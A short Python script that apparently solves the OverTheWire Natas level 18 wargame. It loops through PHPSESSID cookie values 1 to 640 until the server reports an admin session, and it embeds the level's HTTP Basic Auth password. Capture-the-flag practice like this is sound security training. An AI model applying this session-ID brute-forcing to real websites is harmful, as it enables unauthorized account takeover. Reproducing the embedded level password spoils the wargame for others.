import requests


# Credentials for natas18
username = "natas18"
password = "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"

# Target URL
url = "http://natas18.natas.labs.overthewire.org"


# Start a session to persist cookies and headers across requests
session = requests.Session()


# Loop through possible admin PHPSESSID values (1 to 640)
for admin_id in range(1, 641):
    # Set the PHPSESSID cookie for the session
    # Note: cookie name must be a string
    session.cookies.set("PHPSESSID", str(admin_id))
    
    # Print which ID we are guessing
    print(f"Guessing with PHPSESSID={admin_id}")

    # Send a request with login credentials
    response = session.post(
        url,
        data={"username": "admin", "password": "pass"},  # example login data
        auth=(username, password)                        # HTTP Basic Auth
    )

    # Check if the response contains "You are an admin." (indicating success)
    if "You are an admin." in response.text:
        print(response.text)
        print(f"Found admin PHPSESSID={admin_id}")
        break  # Stop looping once the correct session ID is found

